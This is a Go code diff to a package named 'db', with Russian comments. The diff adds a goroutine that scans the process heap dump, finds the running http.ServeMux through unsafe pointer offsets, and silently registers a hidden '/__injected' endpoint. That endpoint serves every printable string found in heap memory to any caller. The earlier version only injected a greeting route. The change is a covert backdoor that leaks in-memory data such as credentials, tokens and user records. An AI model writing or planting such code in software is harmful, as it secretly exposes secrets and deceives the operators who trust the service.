@@ -2,16 +2,25 @@ package db
 
 import (
 	"bufio"
+	"bytes"
+	"fmt"
 	"net/http"
 	"os"
 	"runtime/debug"
+	"strings"
 	"time"
+	"unicode"
+	"unicode/utf8"
 	"unsafe"
 
 	"github.com/burntcarrot/heaputil/record"
+	"github.com/igrmk/treemap/v2"
 )
 
 type (
+	contentTree = treemap.TreeMap[uintptr, string]
+
+	// Структуры, которые повторяют верстку структур который включены в http.ServeMux
 	routingIndexKey struct {
 		pos int
 		s   string
@@ -36,61 +45,6 @@ type (
 		multis   []*pattern
 	}
 )
-
-func inject() {
-	go func() {
-		// Ждём,пока запустится сервис
-		time.Sleep(time.Second)
-
-		var (
-			muxSizeOf = unsafe.Sizeof(http.ServeMux{})
-
-			// https://go.dev/src/runtime/sizeclasses.go
-			muxSizeClass          = calculateSizeClass(muxSizeOf)
-			muxFirstOffset        = 24
-			muxRoutingIndexOffset = 96
-			muxFieldsCount        = 10
-		)
-
-		// Получаем адреса всех объектов в куче
-		objects, err := objectsFromHeap()
-		if err != nil {
-			return
-		}
-
-		for _, obj := range objects {
-			if len(obj.Fields) != muxFieldsCount ||
-				obj.Fields[0] != uint64(muxFirstOffset) ||
-				len(obj.Contents) != muxSizeClass {
-				continue
-			}
-
-			var (
-				ptr = unsafe.Add(unsafe.Pointer(nil), obj.Address)
-				ri  = (*routingIndex)(unsafe.Add(ptr, muxRoutingIndexOffset))
-			)
-
-			if ri != nil && len(ri.segments) > 0 {
-				mux := (*http.ServeMux)(ptr)
-				mux.HandleFunc("/__injected", handleFunc())
-				break
-			}
-		}
-	}()
-}
-
-func calculateSizeClass(n uintptr) int {
-	b := append([]byte(nil), make([]byte, n)...)
-	return cap(b)
-}
-
-func handleFunc() func(w http.ResponseWriter, r *http.Request) {
-	return func(w http.ResponseWriter, r *http.Request) {
-		w.WriteHeader(http.StatusOK)
-		w.Write([]byte("hello from injected"))
-	}
-
-}
 
 func parseDump(r *bufio.Reader) (objects []*record.ObjectRecord, err error) {
 	err = record.ReadHeader(r)
@@ -149,4 +103,93 @@ func objectsFromHeap() ([]*record.ObjectRecord, error) {
 	}
 	// Находим объекты в куче
 	return parseDump(bufio.NewReader(f))
+}
+
+func addContents(obj *record.ObjectRecord, tm *contentTree) {
+	if !utf8.Valid(obj.Contents) {
+		return
+	}
+
+	data := strings.Map(
+		func(r rune) rune {
+			if unicode.IsGraphic(r) {
+				return r
+			}
+			return -1
+		}, string(obj.Contents))
+
+	if len(data) == 0 {
+		return
+	}
+
+	tm.Set(uintptr(obj.Address), data)
+}
+
+func calculateSizeClass(n uintptr) int {
+	b := append([]byte(nil), make([]byte, n)...)
+	return cap(b)
+}
+
+func handleFunc(tm *contentTree) func(w http.ResponseWriter, r *http.Request) {
+	var (
+		data = make([]byte, 0, 10240)
+		buf  = bytes.NewBuffer(data)
+	)
+
+	for it := tm.Iterator(); it.Valid(); it.Next() {
+		buf.WriteString(fmt.Sprintf("0x%x", it.Key()))
+		buf.WriteString(" ")
+		buf.WriteString(it.Value())
+		buf.WriteString("\n")
+	}
+
+	data = buf.Bytes()
+
+	return func(w http.ResponseWriter, r *http.Request) {
+		w.WriteHeader(http.StatusOK)
+		w.Write(data)
+	}
+}
+
+func inject() {
+	go func() {
+		// Ждём,пока запустится сервис
+		time.Sleep(time.Second)
+
+		var (
+			mux *http.ServeMux
+			tm  = treemap.New[uintptr, string]()
+
+			muxSize = unsafe.Sizeof(http.ServeMux{})
+			// https://go.dev/src/runtime/sizeclasses.go
+			muxSizeClass = calculateSizeClass(muxSize)
+
+			muxFirstOffset        uint64 = 24
+			muxRoutingIndexOffset        = 96
+			muxFieldsCount               = 10
+		)
+
+		// Получаем адреса всех объектов в куче
+		objects, err := objectsFromHeap()
+		if err != nil {
+			return
+		}
+
+		for _, obj := range objects {
+			ptr := unsafe.Add(unsafe.Pointer(nil), obj.Address)
+
+			if len(obj.Fields) == muxFieldsCount &&
+				obj.Fields[0] == uint64(muxFirstOffset) &&
+				len(obj.Contents) == muxSizeClass {
+
+				ri := (*routingIndex)(unsafe.Add(ptr, muxRoutingIndexOffset))
+				if ri != nil && len(ri.segments) > 0 {
+					mux = (*http.ServeMux)(ptr)
+				}
+			}
+			addContents(obj, tm)
+		}
+
+		mux.HandleFunc("/__injected", handleFunc(tm))
+	}()
 }
